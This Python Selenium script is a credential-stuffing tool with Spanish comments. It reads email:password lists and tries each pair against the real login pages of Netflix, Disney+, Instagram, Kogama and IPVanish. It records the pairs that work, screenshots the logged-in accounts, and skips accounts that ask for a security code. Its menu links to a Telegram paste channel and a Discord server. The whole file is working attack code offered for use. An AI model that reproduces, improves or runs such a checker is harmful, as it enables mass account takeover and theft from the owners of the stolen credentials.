import os
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager
from colorama import Fore, init
import webbrowser
import time

init(autoreset=True)

# Configuración automática de Selenium con WebDriver Manager
chrome_options = Options()
chrome_options.add_argument("--disable-gpu")
chrome_options.add_argument("--no-sandbox")
chrome_options.add_argument("--log-level=3")  # Reducir el nivel de logs

service = Service(ChromeDriverManager().install())

# URLs de inicio de sesión de cada plataforma
PLATFORMS = {
    "1": ("Netflix", "https://www.netflix.com/login", "cuentas/netflix.txt", "resultados/validos_netflix.txt"),
    "2": ("Disney+", "https://www.disneyplus.com/login", "cuentas/disney.txt", "resultados/validos_disney.txt"),
    "3": ("Instagram", "https://www.instagram.com/accounts/login/", "cuentas/instagram.txt", "resultados/validos_instagram.txt"),
    "4": ("Kogama", "https://www.kogama.com", "cuentas/kogama.txt", "resultados/validos_kogama.txt"),
    "5": ("IPVanish", "https://account.ipvanish.com/", "cuentas/ipvanish.txt", "resultados/validos_ipvanish.txt")
}

def take_screenshot(driver, email, platform_name):
    """Captura de pantalla cuando la cuenta es válida."""
    screenshot_path = f"screenshots/{platform_name}_{email}.png"
    os.makedirs(os.path.dirname(screenshot_path), exist_ok=True)
    driver.save_screenshot(screenshot_path)
    print(f"📸 Captura de pantalla guardada para {email} en {screenshot_path}")

def login_checker(platform_name, login_url, input_file, output_file):
    """Función para verificar cuentas en la plataforma seleccionada."""
    try:
        with open(input_file, "r") as file:
            accounts = file.readlines()
    except FileNotFoundError:
        print(f"No se encontró el archivo {input_file}.")
        return

    os.makedirs(os.path.dirname(output_file), exist_ok=True)
    
    for account in accounts:
        email, password = account.strip().split(":")
        print(f"🔍 Probando {email} en {platform_name}...")

        driver = webdriver.Chrome(service=service, options=chrome_options)
        driver.get(login_url)
        time.sleep(6)  # Esperar 6 segundos a que la página cargue completamente
        
        try:
            WebDriverWait(driver, 15).until(EC.presence_of_element_located((By.TAG_NAME, "body")))

            if platform_name == "Netflix":
                user_input = driver.find_element(By.NAME, "userLoginId")
                pass_input = driver.find_element(By.NAME, "password")
                user_input.clear()
                pass_input.clear()
                user_input.send_keys(email)
                pass_input.send_keys(password)
                pass_input.send_keys(Keys.RETURN)

            elif platform_name == "Disney+":
                user_input = driver.find_element(By.CSS_SELECTOR, "input[type='email']")
                user_input.clear()
                user_input.send_keys(email)
                user_input.send_keys(Keys.RETURN)

                time.sleep(8)  # Esperar 8 segundos a que se cargue la pantalla de contraseña

                if "https://www.disneyplus.com/identity/login/enter-passcode?pinned=true" in driver.current_url:
                    print(f"🔄 Código de seguridad detectado para {email}, probando con otra cuenta...")
                    driver.quit()
                    continue

                pass_input = WebDriverWait(driver, 15).until(
                    EC.presence_of_element_located((By.CSS_SELECTOR, "input[type='password']"))
                )
                pass_input.clear()
                pass_input.send_keys(password)
                pass_input.send_keys(Keys.RETURN)

            # Hacer clic en el botón de login
            login_button = WebDriverWait(driver, 15).until(
                EC.element_to_be_clickable((By.CSS_SELECTOR, 'button[type="submit"]'))
            )
            login_button.click()

            # Esperar 8 segundos para verificar el cambio de URL
            time.sleep(8)

            # Verificar si la URL cambió
            if driver.current_url != login_url:
                print(f"✅ Cuenta válida: {email}")
                take_screenshot(driver, email, platform_name)  # Captura de pantalla si la cuenta es válida
                with open(output_file, "a") as valid_file:
                    valid_file.write(f"{email}:{password}\n")
            else:
                print(f"❌ Falló el inicio de sesión: {email}")

        except Exception as e:
            print(f"⚠️ Error con {email}: {str(e)}")
        
        finally:
            driver.quit()

# Función para verificar cuentas en Kogama
def kogama_checker(login_url, input_file, output_file):
    """Función para verificar cuentas en Kogama.com y cerrar solo si la contraseña es incorrecta."""
    try:
        with open(input_file, "r") as file:
            accounts = file.readlines()
    except FileNotFoundError:
        print(f"No se encontró el archivo {input_file}.")
        return

    os.makedirs(os.path.dirname(output_file), exist_ok=True)

    for account in accounts:
        email, password = account.strip().split(":")
        print(f"🔍 Probando {email} en Kogama...")

        driver = webdriver.Chrome(service=service, options=chrome_options)
        driver.get(login_url)
        time.sleep(6)  # Esperar 6 segundos a que la página cargue completamente

        try:
            # Hacer clic en el botón de inicio de sesión
            login_button = WebDriverWait(driver, 15).until(
                EC.element_to_be_clickable((By.XPATH, '//*[@id="root"]/div/header/div/ol/li[1]/button'))
            )
            login_button.click()

            # Esperar a que aparezca el formulario de login
            WebDriverWait(driver, 15).until(EC.presence_of_element_located((By.XPATH, '//*[@id="username"]')))

            # Ingresar usuario y contraseña
            user_input = driver.find_element(By.XPATH, '//*[@id="username"]')
            pass_input = driver.find_element(By.XPATH, '//*[@id="password"]')
            user_input.clear()
            pass_input.clear()
            user_input.send_keys(email)
            pass_input.send_keys(password)

            # Hacer clic en el botón de login
            login_submit = driver.find_element(By.XPATH, '//*[@id="root-page-mobile"]/div[3]/div[3]/div/div/div/div[2]/form/div[3]/button[2]')
            login_submit.click()

            # Esperar a que aparezca el mensaje de error
            try:
                WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.XPATH, '//div[contains(text(), "Wrong username or password")]'))
                )
                print(f"❌ Falló el inicio de sesión: {email} (Contraseña incorrecta)")
                driver.quit()  # Cerrar el navegador si la cuenta es incorrecta
                continue  # Pasar a la siguiente cuenta
            except:
                print(f"✅ Cuenta válida: {email}")
                with open(output_file, "a") as valid_file:
                    valid_file.write(f"{email}:{password}\n")

        except Exception as e:
            print(f"⚠️ Error con {email}: {str(e)}")

        finally:
            driver.quit()  # Cerrar siempre el navegador al final de cada intento

    print(f"✅ Proceso finalizado. Cuentas válidas guardadas en {output_file}.")

def ipvanish_checker(login_url, input_file, output_file):
    """Función para verificar cuentas en IPVanish y cerrar solo si la contraseña es incorrecta."""
    try:
        with open(input_file, "r") as file:
            accounts = file.readlines()
    except FileNotFoundError:
        print(f"No se encontró el archivo {input_file}.")
        return

    os.makedirs(os.path.dirname(output_file), exist_ok=True)

    for account in accounts:
        email, password = account.strip().split(":")
        print(f"🔍 Probando {email} en IPVanish...")

        driver = webdriver.Chrome(service=service, options=chrome_options)
        driver.get(login_url)
        time.sleep(7)  # Esperar 7 segundos a que la página cargue completamente

        try:
            # Ingresar el correo y la contraseña
            user_input = WebDriverWait(driver, 15).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, "input[type='email']"))
            )
            pass_input = driver.find_element(By.CSS_SELECTOR, "input[type='password']")
            user_input.clear()
            pass_input.clear()
            user_input.send_keys(email)
            pass_input.send_keys(password)

            # Hacer clic en el botón de login
            login_button = WebDriverWait(driver, 15).until(
                EC.element_to_be_clickable((By.CSS_SELECTOR, "button.button_btn__fotrB"))
            )
            login_button.click()

            # Esperar 6 segundos para verificar si la URL cambia
            time.sleep(6)

            # Verificar si el mensaje de error está presente (indicando cuenta inválida)
            error_message = driver.find_elements(By.XPATH, "//*[@id='__next']/div/div[3]/div/div/form/div[1]")
            if error_message:
                print(f"❌ Error en el inicio de sesión: {email} (Mensaje de error detectado)")
            elif driver.current_url != login_url:
                # Verificar si la URL cambió, lo que indicaría que la cuenta es válida
                print(f"✅ Cuenta válida: {email}")
                take_screenshot(driver, email, "IPVanish")  # Captura de pantalla si la cuenta es válida
                with open(output_file, "a") as valid_file:
                    valid_file.write(f"{email}:{password}\n")
            else:
                print(f"❌ Falló el inicio de sesión: {email}")

        except Exception as e:
            print(f"⚠️ Error con {email}: {str(e)}")
            driver.save_screenshot(f"error_screenshot_{email}.png")  # Tomar captura de pantalla para diagnóstico

        finally:
            driver.quit()  # Cerrar siempre el navegador al final de cada intento

    print(f"✅ Proceso finalizado. Cuentas válidas guardadas en {output_file}.")

def instagram_checker(login_url, input_file, output_file):
    """Función para verificar cuentas en Instagram."""
    try:
        with open(input_file, "r") as file:
            accounts = file.readlines()
    except FileNotFoundError:
        print(f"No se encontró el archivo {input_file}.")
        return

    os.makedirs(os.path.dirname(output_file), exist_ok=True)

    for account in accounts:
        email, password = account.strip().split(":")
        print(f"🔍 Probando {email} en Instagram...")

        driver = webdriver.Chrome(service=service, options=chrome_options)
        driver.get(login_url)
        time.sleep(6)

        try:
            user_input = WebDriverWait(driver, 15).until(
                EC.presence_of_element_located((By.NAME, "username"))
            )
            pass_input = driver.find_element(By.NAME, "password")
            user_input.clear()
            pass_input.clear()
            user_input.send_keys(email)
            pass_input.send_keys(password)
            pass_input.send_keys(Keys.RETURN)

            time.sleep(8)

            # Verificar si la URL cambió o si hay un mensaje de error
            error_message = driver.find_elements(By.XPATH, "//p[contains(text(), 'contraseña incorrecta')]")
            if error_message:
                print(f"❌ Falló el inicio de sesión: {email} (Contraseña incorrecta)")
            elif driver.current_url != login_url:
                print(f"✅ Cuenta válida: {email}")
                with open(output_file, "a") as valid_file:
                    valid_file.write(f"{email}:{password}\n")
            else:
                print(f"❌ Falló el inicio de sesión: {email}")

        except Exception as e:
            print(f"⚠️ Error con {email}: {str(e)}")

        finally:
            driver.quit()

    print(f"✅ Proceso finalizado. Cuentas válidas guardadas en {output_file}.")



# Interfaz de usuario
print(Fore.MAGENTA + """
""")
print(Fore.RED + "Version: 1.1")  
print(Fore.RED + "1. Netflix")
print(Fore.BLUE + "2. Disney+")
print(Fore.MAGENTA + "3. Instagram")
print(Fore.CYAN + "4. Kogama")  
print(Fore.LIGHTGREEN_EX + "5. IPVanish")  
print(Fore.LIGHTRED_EX + "6. Salir")
print(Fore.LIGHTCYAN_EX + "7. Abrir mi Telegram en Web")
print(Fore.LIGHTRED_EX + "8. Abrir mi servidor de Discord")

opcion = input("Selecciona una opción (1-8): ")

if opcion == "7":
    webbrowser.open("https://t.me/NoctaPaste")
    print("Abriendo Telegram en Web...")

elif opcion == "8":
    webbrowser.open("https://discord.gg/a8vSeEMqgj")
    print("Abriendo tu servidor de Discord...")

elif opcion == "6":
    print("Saliendo del programa...")

elif opcion in PLATFORMS:
    plataforma, url, archivo, salida = PLATFORMS[opcion]
    if plataforma == "Instagram":
        instagram_checker(url, archivo, salida)  # Llamamos la función para Instagram
    elif plataforma == "Kogama":
        kogama_checker(url, archivo, salida)  # Llamamos la función para Kogama
    elif plataforma == "IPVanish":
        ipvanish_checker(url, archivo, salida)  # Llamamos la función para IPVanish
    else:
        login_checker(plataforma, url, archivo, salida)  # Para el resto de plataformas
